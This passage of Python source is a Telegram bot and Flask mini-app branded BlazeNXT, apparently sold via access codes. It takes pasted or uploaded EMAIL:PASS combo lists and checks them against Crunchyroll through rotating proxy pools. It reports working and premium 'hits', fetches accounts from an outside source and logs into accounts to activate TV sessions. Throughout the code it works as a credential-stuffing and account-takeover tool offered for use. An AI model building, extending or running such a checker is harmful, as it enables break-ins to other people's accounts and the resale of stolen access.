                                 [[("🔁 Try Again", "tv", "success"), ("⬅️ Back", "opanel", "danger")]])
                return
            set_pending(uid, "tv_code", email=m.group(1), pw=m.group(2))
            await reply_menu(msg,
                "📺 <b>TV Activation — Step 2/2</b>\n\n"
                "Now send me the <b>TV code</b> shown on the screen.",
                [[("⬅️ Cancel", "opanel", "danger")]])
            return

        if kind == "tv_code":
            clear_pending(uid)
            email, pw = pending["email"], pending["pw"]
            note = await msg.reply_text("📺 Logging in & activating TV...")
            ok, err = await asyncio.to_thread(_tv_do, email, pw, text.upper())
            if ok:
                await note.edit_text(
                    "✅ <b>TV ACTIVATION SUCCESSFUL!</b>\n\n"
                    "Now open/restart the TV app to sign in.",
                    parse_mode=ParseMode.HTML)
            else:
                await note.edit_text(f"❌ TV activation failed: <code>{esc(err)}</code>",
                                     parse_mode=ParseMode.HTML)
            await reply_menu(msg, "📺 Done!",
                             [[("🔁 Again", "tv", "success"), ("⬅️ Menu", "menu", "danger")]])
            return

        if kind == "file":
            await reply_menu(msg,
                "📂 Send me the <b>file itself</b> (as a document), not text.",
                [[("🔁 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return

    # ---------- no active flow ----------
    if text.startswith("/"):
        if _has_access(uid):
            try:
                nm = getattr(user, "first_name", None) or str(uid)
                mtext = welcome_premium_text(uid, nm)
                _, rows = menu_main(uid)
                await reply_menu(msg, mtext, rows)
                return
            except Exception:
                pass
        mtext, rows = menu_main(uid)
        await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + mtext, rows)
        return

    creds = extract_credentials(text)
    if creds:
        if not _has_access(uid):
            await reply_menu(msg, access_denied_html(),
                             [[("🎫 Redeem Access Code", "redeem_flow", "success")]])
            return
        if len(creds) > MAX_PASTED_CREDS:
            await reply_menu(msg,
                f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.",
                [[("📂 Check File", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return
        await _run_and_report(msg, uid, text)
        return

    # premium fallback
    if _has_access(uid):
        try:
            nm = getattr(user, "first_name", None) or str(uid)
            mtext = welcome_premium_text(uid, nm)
            _, rows = menu_main(uid)
            await reply_menu(msg, mtext, rows)
            return
        except Exception:
            pass
    mtext, rows = menu_main(uid)
    await reply_menu(msg, mtext, rows)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.document:
        return
    uid = user.id
    pending = get_pending(uid)

    if pending and pending["kind"] != "file":
        await msg.reply_text(
            "⏳ I'm waiting for a different input — press ⬅️ Back, or send the right thing."
        )
        return
    if pending:
        clear_pending(uid)
    elif not _has_access(uid):
        text, rows = menu_main(uid)
        await reply_menu(msg, text, rows)
        return

    doc = msg.document
    name = (doc.file_name or "unknown.txt").lower()
    if not name.endswith((".txt", ".log", ".json", ".csv")):
        await reply_menu(msg, "❌ Only <code>.txt / .log / .json / .csv</code> files allowed.",
                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
        return
    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
        await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
        return

    note = await msg.reply_text("📥 Downloading file...")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        tmp_path = Path(tempfile.gettempdir()) / f"crunchy_{uid}_{int(time.time())}.txt"
        await tg_file.download_to_drive(str(tmp_path))
        text = tmp_path.read_text(encoding="utf-8", errors="ignore")
        tmp_path.unlink(missing_ok=True)
    except Exception as e:
        await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>",
                             parse_mode=ParseMode.HTML)
        return
    if not text.strip():
        await note.edit_text("❌ File is empty.")
        return
    await _run_and_report(msg, uid, text)


# AIO service names for "coming soon" messages
_SVC_NAMES = {
    "svc_crunchy": "🍥 CRUNCHYROLL",
}

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q or not q.message:
        return
    uid = q.from_user.id
    data = q.data or ""
    await q.answer()
    clear_pending(uid)  # any button press abandons the previous input flow
    m = q.message

    # Premium AIO services — not yet implemented, show premium "coming soon" card
    if data.startswith("svc_"):
        name = _SVC_NAMES.get(data, data)
        await edit_menu(m,
            f"🌟 <b>{esc(name)} — Coming Soon</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "This module is part of the <b>BlazeNXT</b> suite.\n"
            "Currently only <b>🍥 CRUNCHYROLL</b> is active.\n\n"
            "👉 Tap <b>🍥 CRUNCHYROLL</b> to check Crunchyroll accounts.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🔥 <b>BlazeNXT</b>",
            [[("🍥 CRUNCHYROLL", "check", "success"), ("⬅️ Back", "menu", "danger")]])
        return

    if data == "menu":
        # try to get user display name for premium header
        try:
            nm = q.from_user.first_name or str(uid)
        except Exception:
            nm = str(uid)
        # rebuild premium header with name
        if _has_access(uid):
            try:
                text = welcome_premium_text(uid, nm)
                _, rows = menu_main(uid)
                await edit_menu(m, text, rows)
                return
            except Exception:
                pass
        text, rows = menu_main(uid)
        await edit_menu(m, text, rows)

    elif data == "help":
        await edit_menu(m, help_text(), [[("⬅️ Back", "menu", "danger")]])

    elif data in ("check", "file"):
        if not _has_access(uid):
            await edit_menu(m, access_denied_html(),
                            [[("🎫 Redeem Access Code", "redeem_flow", "success")]])
            return
        if data == "check":
            set_pending(uid, "creds")
            text = (
                "📝 <b>Check Account</b>\n\n"
                "Send me one or more lines in this format:\n"
                "<code>EMAIL:PASS</code>\n\n"
                "Example: <code>user@gmail.com:mypassword</code>"
            )
        else:
            set_pending(uid, "file")
            text = "📂 <b>Check File</b>\n\nSend me a <code>.txt / .log / .json / .csv</code> file."
        await edit_menu(m, text, [[("⬅️ Back", "menu", "danger")]])

    elif data == "mode":
        if not _has_access(uid):
            await edit_menu(m, access_denied_html(),
                            [[("🎫 Redeem Access Code", "redeem_flow", "success")]])
            return
        new = not STORE.get_premium_only(uid)
        STORE.set_premium_only(uid, new)
        text, rows = menu_main(uid)
        text = f"🎛 Output Mode: <b>{'Premium Only' if new else 'All Working'}</b>\n\n" + text
        await edit_menu(m, text, rows)

    elif data == "myaccess":
        if is_admin(uid, getattr(q.from_user, "username", None)):
            text = "👑 <b>Owner Access</b>\n\nUnlimited."
        else:
            ok, exp = STORE.has_access(uid)
            text = f"✅ <b>Access Active</b>\n\n⏳ Expires: <code>{fmt_dt(exp)}</code>"
        await edit_menu(m, text,
                        [[("🎛 Output Mode", "mode", "primary"), ("⬅️ Back", "menu", "danger")]])

    elif data == "redeem_flow":
        set_pending(uid, "redeem")
        await edit_menu(m,
            "🔑 <b>Redeem Code</b>\n\nSend me your access code (plain text).",
            [[("⬅️ Back", "menu", "danger")]])

    elif data == "opanel":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        text, rows = menu_owner()
        await edit_menu(m, text, rows)

    elif data == "genpick":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        rows = [
            [("⏳ 24 Hours", "gen_24", "success"), ("⏳ 48 Hours", "gen_48", "success")],
            [("⏳ 72 Hours", "gen_72", "success")],
            [("⬅️ Back", "opanel", "danger")],
        ]
        await edit_menu(m, "🔑 <b>Generate Code</b>\n\nPick a duration 👇", rows)

    elif data in ("gen_24", "gen_48", "gen_72"):
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        hours = int(data.split("_")[1])
        code = generate_code()
        exp = STORE.add_code(code, hours)
        rows = [[("🔁 New Code", "genpick", "success"), ("⬅️ Menu", "menu", "danger")]]
        await edit_menu(m,
            f"✅ <b>Code Generated!</b>\n\n🔑 <code>{code}</code>\n"
            f"⏳ Valid: <code>{hours}h</code> (until {fmt_dt(exp)})\n\n"
            "Send it to the user — they redeem it with the 🎫 button.",
            rows)

    elif data == "status":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        await edit_menu(m, status_text(),
                        [[("📡 Refresh Proxies", "refresh", "primary"),
                          ("⬅️ Back", "opanel", "danger")]])

    elif data == "refresh":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        await edit_menu(m, "🔄 <b>Refreshing proxies...</b>\n⏳ Please wait", None)
        try:
            await asyncio.to_thread(refresh_live_proxies, True)
            await edit_menu(m, f"✅ <b>Live proxies ready:</b> <code>{proxy_count()}</code>",
                            [[("⬅️ Back", "opanel", "danger")]])
        except Exception as e:
            await edit_menu(m, f"❌ Error: <code>{esc(str(e)[:120])}</code>",
                            [[("⬅️ Back", "opanel", "danger")]])

    elif data == "pool":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        ac = bool(STORE.get_setting("auto_check", True))
        text = (
            "🌐 <b>Proxy Pool</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 Pool (user-added): <code>{pool_size()}</code>\n"
            f"🌐 Live in use: <code>{proxy_count()}</code>\n"
            f"⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code>\n"
            f"🔁 Auto Refresh: <code>{PROXY_REFRESH_MINUTES} min</code>"
        )
        await edit_menu(m, text,
                        [[("📥 Add Proxies", "addpx", "primary"),
                          ("🧹 Clear Pool", "clearpool", "danger")],
                         [("⬅️ Back", "opanel", "danger")]])

    elif data == "addpx":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        set_pending(uid, "addpx")
        await edit_menu(m,
            "📥 <b>Add Proxies</b>\n\n"
            "Paste your proxy lines (one per line):\n"
            "<code>host:port</code> or <code>user:pass:host:port</code> "
            "or full <code>http://…</code> urls.\n\n"
            "Max " + str(MAX_PASTED_PROXIES) + " lines.",
            [[("⬅️ Back", "opanel", "danger")]])

    elif data == "clearpool":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        await asyncio.to_thread(clear_pool)
        text, rows = menu_owner()
        await edit_menu(m, "🧹 <b>Pool cleared.</b> Live list reset too.\n\n" + text, rows)

    elif data == "autocheck":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        new = not bool(STORE.get_setting("auto_check", True))
        STORE.set_setting("auto_check", new)
        extra = ("ON = added proxies are auto-tested in the background and only live ones are used.\n"
                 if new else "OFF = added proxies are used immediately without testing.\n")
        await edit_menu(m,
            f"⚙️ <b>Auto-Check Proxies: {'ON' if new else 'OFF'}</b>\n\n"
            f"{extra}Added proxies are saved to disk and survive restarts.",
            [[("⬅️ Back", "opanel", "danger")]])

    elif data == "oxaam":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        await edit_menu(m, "🤖 <b>Oxaam Fetch</b>\n⏳ Pulling a fresh account...", None)
        try:
            email, pw, res = await asyncio.to_thread(_oxaam_do)
        except Exception as e:
            await edit_menu(m, f"❌ Error: <code>{esc(str(e)[:120])}</code>",
                            [[("🔁 Again", "oxaam", "success"), ("⬅️ Back", "opanel", "danger")]])
            return
        if not email:
            await edit_menu(m, "❌ Could not extract from Oxaam. Try again later.",
                            [[("🔁 Again", "oxaam", "success"), ("⬅️ Back", "opanel", "danger")]])
            return
        bump_checks(1 if (res and res["st"] == "hit") else 0)
        await edit_menu(m, _oxaam_report(email, pw, res),
                        [[("🔁 Again", "oxaam", "success"), ("⬅️ Back", "opanel", "danger")]])

    elif data == "tv":
        if not is_admin(uid, getattr(q.from_user, "username", None)):
            await edit_menu(m, "⛔ Owner only.", [[("⬅️ Back", "menu", "danger")]])
            return
        set_pending(uid, "tv_email")
        await edit_menu(m,
            "📺 <b>TV Activation — Step 1/2</b>\n\n"
            "Send me <code>EMAIL:PASS</code> of the account.",
            [[("⬅️ Back", "opanel", "danger")]])


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Unhandled error: %s", context.error, exc_info=context.error)
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ Internal error — try again or contact the owner."
            )
    except Exception:
        pass


# ===================== ENTRYPOINT =====================

# ──────────────────────────────── Mini App Server ───────────────────────────────
# Serves ./miniapp/ and exposes /api/* reusing bot's STORE + checker

_miniapp_app = None
_miniapp_started = False

def _get_miniapp_url() -> str:
    if MINI_APP_URL:
        return MINI_APP_URL.rstrip("/")
    # Railway public domain fallback
    dom = _env("RAILWAY_PUBLIC_DOMAIN", "") or _env("RAILWAY_STATIC_URL", "")
    if dom:
        dom = dom.replace("https://","").replace("http://","").rstrip("/")
        return f"https://{dom}"
    return ""

def _miniapp_status_dict():
    import time as _t
    try:
        up = int(_t.time() - max(getattr(STORE,"started_at", _t.time()), 1)) if getattr(STORE,"started_at",0) else 0
    except Exception:
        up = 0
    # proxy counts from globals LIVE_PROXIES + pool file
    try:
        _pool_list = pool_load() if "pool_load" in globals() else []
    except Exception:
        _pool_list = []
    try:
        _live = proxy_count() if "proxy_count" in globals() else len(LIVE_PROXIES)
    except Exception:
        _live = len(LIVE_PROXIES) if "LIVE_PROXIES" in globals() else 0
    # auto-check setting
    try:
        _auto = STORE.get_setting("auto_check", True) if STORE else True
    except Exception:
        _auto = True
    try:
        _users = len(getattr(STORE, "users", {})) if STORE else 0
    except Exception:
        _users = 0
    return {
        "ok": True,
        "blazenxt": "BlazeNXT",
        "version": "v10",
        "uptime": f"{up//3600}h {(up%3600)//60}m {up%60}s",
        "uptime_s": up,
        "started_at": getattr(STORE,"started_at",0) if STORE else 0,
        "pool": len(_pool_list),
        "live": _live,
        "live_proxies": _live,
        "auto_check": bool(_auto),
        "users": _users,
        "pool_proxies": len(_pool_list),
        "miniapp_url": _get_miniapp_url(),
        "bot": OWNER_USERNAME or "",
    }

def _build_flask_app():
    global _miniapp_app
    if _miniapp_app is not None:
        return _miniapp_app
    if not FLASK_OK or Flask is None:
        return None
    app = Flask(__name__, static_folder=str(MINI_APP_PATH), static_url_path="")
    if CORS:
        CORS(app)
    else:
        # minimal CORS fallback
        @app.after_request
        def _cors(resp):
            resp.headers["Access-Control-Allow-Origin"] = "*"
            resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
            resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
            return resp

    @app.get("/health")
    def _health():
        return jsonify({"ok": True, "blazenxt": "alive"}), 200

    @app.get("/")
    def _idx():
        p = MINI_APP_PATH / "index.html"
        if p.exists():
            return send_from_directory(str(MINI_APP_PATH), "index.html")
        return "Mini App not found", 404

    @app.get("/style.css")
    def _css():
        return send_from_directory(str(MINI_APP_PATH), "style.css")

    @app.get("/app.js")
    def _js():
        return send_from_directory(str(MINI_APP_PATH), "app.js")

    @app.get("/api/status")
    def _api_status():
        return jsonify(_miniapp_status_dict())

    @app.get("/api/proxy/status")
    def _api_proxy_status():
        return jsonify(_miniapp_status_dict())

    @app.post("/api/proxy/add")
    def _api_proxy_add():
        try:
            data = request.get_json(force=True) or {}
            lines = data.get("lines") or data.get("proxies") or []
            if isinstance(lines, str):
                lines = lines.splitlines()
        except Exception:
            lines = []
        # Use the real helper: add_proxies_to_pool
        try:
            ac = STORE.get_setting("auto_check", True) if STORE else True
        except Exception:
            ac = True
        try:
            added, invalid = add_proxies_to_pool(lines, ac) if "add_proxies_to_pool" in globals() else (0, len(lines))
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)}), 500
        try:
            pool_n = len(pool_load()) if "pool_load" in globals() else 0
        except Exception:
            pool_n = 0
        return jsonify({"ok": True, "added": added, "invalid": invalid, "pool": pool_n})

    @app.post("/api/proxy/clear")
    def _api_proxy_clear():
        try:
            clear_pool() if "clear_pool" in globals() else None
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)}), 500
        return jsonify({"ok": True})

    @app.post("/api/proxy/refresh")
    def _api_proxy_refresh():
        try:
            import threading
            if "refresh_live_proxies" in globals():
                threading.Thread(target=lambda: refresh_live_proxies(True), daemon=True).start()
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)}), 500
        return jsonify({"ok": True, "msg": "refresh triggered"})

    @app.post("/api/code/generate")
    def _api_code_gen():
        import time as _t, secrets, string
        try:
            body = request.get_json(force=True) or {}
            hours = int(body.get("hours") or body.get("duration") or 24)
        except Exception:
            hours = 24
        if hours not in (24,48,72):
            hours = 24
        # reuse STORE gen if exists, else local
        code = ""
        expiry = ""
        try:
            if hasattr(STORE, "gen_code"):
                code = STORE.gen_code(hours)
                # gen_code may return (code, expiry) or code
                if isinstance(code, (list, tuple)):
                    code, expiry = code[0], str(code[1]) if len(code)>1 else ""
                else:
                    expiry = _t.strftime("%Y-%m-%d %H:%M", _t.gmtime(_t.time()+hours*3600))
            else:
                alphabet = string.ascii_letters + string.digits
                code = "BLAZE-" + "".join(secrets.choice(alphabet) for _ in range(12)).upper()
                # store in STORE.codes if exists
                exp = int(_t.time()) + hours*3600
                expiry = _t.strftime("%Y-%m-%d %H:%M UTC", _t.gmtime(exp))
                if hasattr(STORE, "codes"):
                    STORE.codes[code] = {"hours": hours, "exp": exp, "used": False}
                    STORE.save() if hasattr(STORE, "save") else None
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)}), 500
        return jsonify({"ok": True, "code": code, "expiry": expiry, "hours": hours})

    @app.post("/api/check")
    def _api_check():
        import time as _t
        try:
            body = request.get_json(force=True) or {}
            text = body.get("text") or body.get("combo") or body.get("combos") or ""
            premium_only = bool(body.get("premium_only") or body.get("premiumOnly"))
        except Exception:
            return jsonify({"ok": False, "error": "invalid json"}), 400
        if not text or not text.strip():
            return jsonify({"ok": False, "error": "no combos"}), 400
        # Use the single source of truth: run_check(text) — it handles extract + threading + proxy rotation
        try:
            # Limit bulk for same-service Railway (protect OOM)
            creds_preview = extract_credentials(text) if "extract_credentials" in globals() else []
            MAX = 500
            if len(creds_preview) > MAX:
                # Truncate text to first MAX lines that contain a match — simpler: just trim
                lines = text.splitlines()
                keep = []
                for ln in lines:
                    if len(keep) >= MAX:
                        break
                    if ln.strip():
                        keep.append(ln)
                text = "\n".join(keep)
            t0 = _t.time()
            res = run_check(text) if "run_check" in globals() else {"hits":[],"free":[],"bad":0,"err":0,"twofa":0,"rate":0,"live_feed":[],"total":0,"processed":0}
            elapsed = _t.time() - t0
            # run_check already gives seconds/cpm/elapsed; ensure fields
            total = res.get("total", 0)
            hits = res.get("hits") or []
            free = res.get("free") or []
            # premium_only filter: only keep hits that are Premium
            if premium_only:
                hits = [h for h in hits if (h.get("data",{}).get("plan") or "").strip()]
                # hits already are premium; free stays but API will hide? Keep as is
                free = []  # when premium_only, hide free
            # Normalize hits for front-end: ensure cred.value/password present
            proxies = proxy_count() if "proxy_count" in globals() else 0
            # Build UI-friendly response — keep run_check shape plus computed fields
            rate_str = f"{(len(hits)/total*100):.1f}%" if total else "0%"
            cpm_val = res.get("cpm", 0)
            # Ensure cpm is int
            try:
                cpm_val = int(cpm_val) if isinstance(cpm_val, (int,float)) else 0
            except Exception:
                cpm_val = 0
            return jsonify({
                "ok": True,
                "total": total,
                "processed": res.get("processed", total),
                "hits": hits,
                "free": free,
                "bad": res.get("bad", 0),
                "err": res.get("err", 0),
                "twofa": res.get("twofa", 0),
                "rate": res.get("rate", 0) if not premium_only else rate_str,
                "cpm": cpm_val,
                "seconds": res.get("seconds", round(elapsed,1)),
                "elapsed": res.get("elapsed", elapsed),
                "eta": "—",
                "proxies": proxies,
                "live_feed": res.get("live_feed", [])[-5:],
                "premium_only": premium_only,
            })
        except Exception as e:
            import traceback
            traceback.print_exc()
            return jsonify({"ok": False, "error": str(e)}), 500

    # catch-all for /assets etc -> static
    @app.get("/<path:path>")
    def _static(path):
        try:
            return send_from_directory(str(MINI_APP_PATH), path)
        except Exception:
            return "not found", 404

    _miniapp_app = app
    return app

def start_miniapp_server():
    global _miniapp_started
    if _miniapp_started:
        return
    if not FLASK_OK:
        print("[miniapp] Flask not available — miniapp disabled (pip install Flask flask-cors)")
        return
    if not MINI_APP_PATH.exists():
        print(f"[miniapp] folder not found: {MINI_APP_PATH}")
        return
    try:
        app = _build_flask_app()
        if app is None:
            return
        import threading
        def _run():
            try:
                print(f"[miniapp] serving {MINI_APP_PATH} on 0.0.0.0:{PORT}  url={_get_miniapp_url() or '(no MINI_APP_URL)'}")
                app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
            except Exception as e:
                print(f"[miniapp] server error: {e}")
        th = threading.Thread(target=_run, daemon=True, name="miniapp")
        th.start()
        _miniapp_started = True
    except Exception as e:
        print(f"[miniapp] start failed: {e}")

async def _post_init_set_menu(app):
    """PTB post_init hook — runs inside the bot's event loop after initialize."""
    url = _get_miniapp_url()
    if not url:
        print("[miniapp] MINI_APP_URL not set — menu webapp skipped (set MINI_APP_URL or RAILWAY_PUBLIC_DOMAIN)")
        return
    try:
        from telegram import MenuButtonWebApp, WebAppInfo
        await app.bot.set_chat_menu_button(menu_button=MenuButtonWebApp(text="BlazeNXT", web_app=WebAppInfo(url=url)))
        print(f"[miniapp] menu button set: {url}")
    except Exception as e:
        print(f"[miniapp] set_chat_menu_button failed: {e}")

def setup_miniapp_menu(app):
    # Legacy wrapper — now handled via post_init; kept for compatibility
    # If called before run_polling (old path), schedule via post_init instead of asyncio.run
    print("[miniapp] setup_miniapp_menu is now handled via post_init — url:", _get_miniapp_url() or "not set")


# ── Premium wrappers for text generators ──
# Ensure every user-visible message uses <tg-emoji> premium tags
try:
    _orig_welcome_premium_text = welcome_premium_text
    def welcome_premium_text(uid, name):
        return _premium_wrap(_orig_welcome_premium_text(uid, name))
except Exception: pass

try:
    _orig_help_text = help_text
    def help_text():
        return _premium_wrap(_orig_help_text())
except Exception: pass

try:
    _orig_status_text = status_text
    def status_text():
        return _premium_wrap(_orig_status_text())
except Exception: pass

try:
    _orig_hit_card = hit_card
    def hit_card(entry):
        return _premium_wrap(_orig_hit_card(entry))
except Exception: pass

try:
    _orig_summary_text = summary_text
    def summary_text(results):
        return _premium_wrap(_orig_summary_text(results))
except Exception: pass

try:
    _orig_progress_text = progress_text
    def progress_text(results):
        return _premium_wrap(_orig_progress_text(results))
except Exception: pass

try:
    _orig_oxaam_report = _oxaam_report
    def _oxaam_report(email, pw, res):
        return _premium_wrap(_orig_oxaam_report(email, pw, res))
except Exception: pass

# Also wrap generic send functions that may bypass _send_menu
try:
    _orig_send_hit_cards = send_hit_cards
    async def send_hit_cards(msg, entries, cap=8):
        # entries already premium via hit_card, but ensure
        return await _orig_send_hit_cards(msg, entries, cap)
except Exception: pass

def main():
    # Start Flask FIRST so Railway health check passes even if token is bad
    try:
        print(f"[miniapp] pre-start Flask on 0.0.0.0:{PORT} ...")
        start_miniapp_server()
    except Exception as _e:
        print(f"[miniapp] pre-start failed: {_e}")

    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("[!] BOT_TOKEN is not set.  Export BOT_TOKEN=<token from @BotFather>")
        print(f"[!] Flask health endpoint stays up on :{PORT} (/health) — fix BOT_TOKEN and redeploy")
        # Keep process alive for health check + logs
        import time as _time
        while True:
            _time.sleep(3600)
    if not OWNER_ID:
        print("[!] OWNER_ID is not set (or not a number).  Export OWNER_ID=<your Telegram numeric id>")
        sys.exit(1)

    global STORE
    STORE = Store(DATA_DIR / "store.json")

    print(f"[*] CrunchyrollChecker — BlazeNXT v10 starting")
    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Admins: IDs={len(ADMIN_IDS)} Usernames={len(ADMIN_USERNAMES)}")
    if ADMIN_IDS - {OWNER_ID}:
        print(f"[*] Extra Admin IDs: {sorted(ADMIN_IDS - {OWNER_ID})}")
    if ADMIN_USERNAMES:
        print(f"[*] Admin Usernames: {sorted(ADMIN_USERNAMES)}")
    print(f"[*] Threads: {THREADS} | SOCKS5: {SOCKS5_OK} | Data dir: {DATA_DIR.resolve()}")

    _load_pool_into_live()
    threading.Thread(target=_proxy_loop, daemon=True).start()

    # Build with post_init to set WebApp menu inside event loop (avoids asyncio.run event-loop-closed bug)
    app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).post_init(_post_init_set_menu).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(MessageHandler(filters.COMMAND, cmd_any))  # any other /cmd -> buttons
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_error_handler(on_error)

    print("[+] Bot running. Ctrl+C to stop.")
    # PTB handles retries for getMe; log token prefix for debug (masked)
    print(f"[*] Token: {BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]} len={len(BOT_TOKEN)} | Polling...")
    # Keep Flask alive even if polling crashes — Railway health check needs /health
    import time as _time
    while True:
        try:
            app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            break  # clean exit
        except Exception as e:
            # Log and retry after 5s — prevents crash-loop from killing Flask health endpoint
            print(f"[!] Polling crashed: {e} — retry in 5s (Flask stays up on :{PORT})")
            import traceback as _tb
            _tb.print_exc()
            _time.sleep(5)
            # Ensure Flask still running
            try:
                start_miniapp_server()
            except Exception:
                pass


if __name__ == "__main__":
    main()
